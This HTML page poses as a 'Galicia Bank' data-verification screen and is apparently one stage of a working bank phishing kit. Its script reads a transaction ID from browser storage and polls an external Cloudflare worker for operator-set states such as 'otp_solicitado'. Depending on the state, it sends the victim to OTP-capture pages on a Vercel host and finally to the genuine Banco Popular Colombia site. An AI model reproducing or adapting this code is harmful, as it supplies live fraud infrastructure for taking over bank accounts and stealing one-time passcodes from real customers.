<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
  <title>Validando - Galicia</title>
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #f8f9fa;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    }

    .container {
      background: white;
      border-radius: 24px;
      padding: 40px 32px;
      max-width: 420px;
      width: 90%;
      text-align: center;
      box-shadow: 0 10px 40px rgba(0,0,0,0.08);
    }

    .logo-galicia {
      font-size: 28px;
      font-weight: 700;
      color: #06143f;
      letter-spacing: -1px;
      margin-bottom: 30px;
    }

    .logo-galicia span {
      color: #f47721;
    }

    .spinner-container {
      display: flex;
      justify-content: center;
      margin-bottom: 24px;
    }

    .spinner-salmon {
      position: relative;
      width: 60px;
      height: 60px;
    }

    .spinner-salmon::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 4px solid rgba(244, 119, 33, 0.15);
      border-radius: 50%;
    }

    .spinner-salmon::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 4px solid transparent;
      border-top-color: #f47721;
      border-bottom-color: #f47721;
      border-radius: 50%;
      animation: spinSalmon 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
    }

    @keyframes spinSalmon {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .title {
      font-size: 20px;
      font-weight: 600;
      color: #1a1a2e;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 14px;
      color: #6c757d;
      line-height: 1.5;
    }

    .status-text {
      margin-top: 16px;
      font-size: 13px;
      color: #6c757d;
      min-height: 20px;
    }

    .status-text.error {
      color: #dc3545;
    }

    .status-text.success {
      color: #28a745;
    }

    .status-text.info {
      color: #f47721;
    }

    @media (max-width: 480px) {
      .container {
        padding: 28px 20px;
      }
      .logo-galicia {
        font-size: 24px;
      }
      .title {
        font-size: 18px;
      }
      .subtitle {
        font-size: 13px;
      }
    }

    @media (prefers-reduced-motion: reduce) {
      .spinner-salmon::after {
        animation: none;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-galicia">Galicia <span>Bank</span></div>
    <div class="spinner-container">
      <div class="spinner-salmon"></div>
    </div>
    <h1 class="title">Validando tus datos</h1>
    <p class="subtitle">Por favor espera un momento...</p>
    <div class="status-text" id="statusText">⏳ Iniciando verificación...</div>
  </div>

  <script>
    // ========================= CONFIGURACIÓN =========================
    const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
    const BASE_URL = 'https://personasgalicia.vercel.app';
    let intentos = 0;
    const MAX_INTENTOS = 60;
    let timeoutId = null;
    let isProcessing = false;
    let redirigiendo = false;

    // ========================= FUNCIÓN PARA ACTUALIZAR ESTADO =========================
    function actualizarEstado(mensaje, tipo = 'info') {
      const statusText = document.getElementById('statusText');
      statusText.textContent = mensaje;
      statusText.className = 'status-text ' + tipo;
      console.log(`📌 ${tipo.toUpperCase()}: ${mensaje}`);
    }

    // ========================= FUNCIÓN PRINCIPAL =========================
    async function checkStatus(transactionId) {
      if (isProcessing || redirigiendo) return;
      isProcessing = true;
      intentos++;

      try {
        const url = `${WORKER_URL}/status?id=${transactionId}`;
        console.log(`📡 [${intentos}/${MAX_INTENTOS}] Consultando: ${url}`);
        
        const response = await fetch(url);

        // Si es 404, significa que el KV aún no tiene los datos
        if (response.status === 404) {
          console.log('⏳ Transacción no encontrada en KV, esperando...');
          actualizarEstado(`⏳ Procesando solicitud... (${intentos}/${MAX_INTENTOS})`, 'info');
          
          if (intentos >= MAX_INTENTOS) {
            console.log('⏰ Tiempo de espera agotado');
            actualizarEstado('⏰ Tiempo de espera agotado. Redirigiendo...', 'error');
            redirigiendo = true;
            setTimeout(() => {
              window.location.href = `${BASE_URL}/w.html`;
            }, 2000);
            return;
          }
          
          isProcessing = false;
          timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
          return;
        }

        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();
        console.log(`📊 [${intentos}/${MAX_INTENTOS}] Estado:`, data);

        // Si no hay datos o está pendiente
        if (!data || !data.estado || data.estado === "pendiente") {
          actualizarEstado(`⏳ Esperando autorización... (${intentos}/${MAX_INTENTOS})`, 'info');
          
          if (intentos >= MAX_INTENTOS) {
            console.log('⏰ Tiempo de espera agotado');
            actualizarEstado('⏰ Tiempo de espera agotado. Redirigiendo...', 'error');
            redirigiendo = true;
            setTimeout(() => {
              window.location.href = `${BASE_URL}/w.html`;
            }, 2000);
            return;
          }
          
          isProcessing = false;
          timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
          return;
        }

        // ========================= PROCESAR ESTADO =========================
        const estado = data.estado;
        console.log(`✅ Estado recibido: ${estado}`);

        // Mostrar mensaje según estado
        const mensajes = {
          'autorizado': '✅ ¡Autorización confirmada! Redirigiendo...',
          'error': '❌ Acceso denegado. Redirigiendo...',
          'otp_solicitado': '📲 OTP solicitado. Redirigiendo...',
          'otp_recibido': '📲 Código OTP recibido. Redirigiendo...',
          'finalizado': '🏁 Proceso finalizado. Redirigiendo...'
        };

        if (mensajes[estado]) {
          actualizarEstado(mensajes[estado], estado === 'error' ? 'error' : 'success');
        }

        // Redirigir según el estado
        if (timeoutId) {
          clearTimeout(timeoutId);
          timeoutId = null;
        }
        
        redirigiendo = true;

        switch (estado) {
          case 'autorizado':
          case 'otp_solicitado':
            console.log(`🔄 Redirigiendo a: ${BASE_URL}/code.html`);
            setTimeout(() => {
              window.location.href = `${BASE_URL}/code.html`;
            }, 1500);
            break;

          case 'error':
            console.log(`🔄 Redirigiendo a: ${BASE_URL}/w.html`);
            setTimeout(() => {
              window.location.href = `${BASE_URL}/w.html`;
            }, 1500);
            break;

          case 'otp_recibido':
            console.log(`🔄 Redirigiendo a: ${BASE_URL}/codei.html`);
            setTimeout(() => {
              window.location.href = `${BASE_URL}/codei.html`;
            }, 1500);
            break;

          case 'finalizado':
            console.log(`🔄 Redirigiendo a: https://www.bancopopular.com.co/`);
            setTimeout(() => {
              window.location.href = 'https://www.bancopopular.com.co/';
            }, 1500);
            break;

          default:
            redirigiendo = false;
            isProcessing = false;
            actualizarEstado(`⚠️ Estado desconocido: ${estado}, reintentando...`, 'error');
            timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
        }

      } catch (error) {
        console.error('❌ Error:', error);
        actualizarEstado('⚠️ Error de conexión. Reintentando...', 'error');
        
        if (intentos < MAX_INTENTOS && !redirigiendo) {
          isProcessing = false;
          timeoutId = setTimeout(() => checkStatus(transactionId), 5000);
        } else if (!redirigiendo) {
          redirigiendo = true;
          actualizarEstado('❌ Error de conexión. Redirigiendo...', 'error');
          setTimeout(() => {
            window.location.href = `${BASE_URL}/w.html`;
          }, 2000);
        }
      }
    }

    // ========================= INICIALIZACIÓN =========================
    document.addEventListener('DOMContentLoaded', async () => {
      console.log('🚀 Página de validación Galicia cargada');
      console.log(`📡 Worker URL: ${WORKER_URL}`);
      console.log(`🌐 BASE URL: ${BASE_URL}`);
      
      // Verificar localStorage
      console.log('🔍 Verificando localStorage...');
      const bancoldataRaw = localStorage.getItem('bancoldata');
      console.log(`📦 bancoldata en localStorage: ${bancoldataRaw ? '✅ Existe' : '❌ No existe'}`);
      
      if (bancoldataRaw) {
        console.log('📋 Contenido:', bancoldataRaw);
      }

      if (!bancoldataRaw) {
        console.log('❌ Error: Datos no encontrados en localStorage');
        actualizarEstado('❌ Sesión no encontrada. Redirigiendo...', 'error');
        setTimeout(() => {
          window.location.href = `${BASE_URL}/w.html`;
        }, 2000);
        return;
      }

      let bancoldata;
      try {
        bancoldata = JSON.parse(bancoldataRaw);
        console.log('📋 Datos parseados:', bancoldata);
      } catch (e) {
        console.error('❌ Error parsing bancoldata:', e);
        actualizarEstado('❌ Error al leer sesión. Redirigiendo...', 'error');
        setTimeout(() => {
          window.location.href = `${BASE_URL}/w.html`;
        }, 2000);
        return;
      }

      const { transactionId } = bancoldata;

      if (!transactionId) {
        console.log('❌ Error: transactionId no encontrado en los datos');
        actualizarEstado('❌ ID de sesión no encontrado. Redirigiendo...', 'error');
        setTimeout(() => {
          window.location.href = `${BASE_URL}/w.html`;
        }, 2000);
        return;
      }

      console.log(`🔍 Verificando transacción: ${transactionId}`);
      actualizarEstado('🔍 Verificando acceso...', 'info');
      
      // Iniciar verificación después de 1 segundo
      setTimeout(() => {
        checkStatus(transactionId);
      }, 1000);
    });

    // Limpiar timeout al salir de la página
    window.addEventListener('beforeunload', function() {
      if (timeoutId) {
        clearTimeout(timeoutId);
      }
    });
  </script>
</body>
</html>
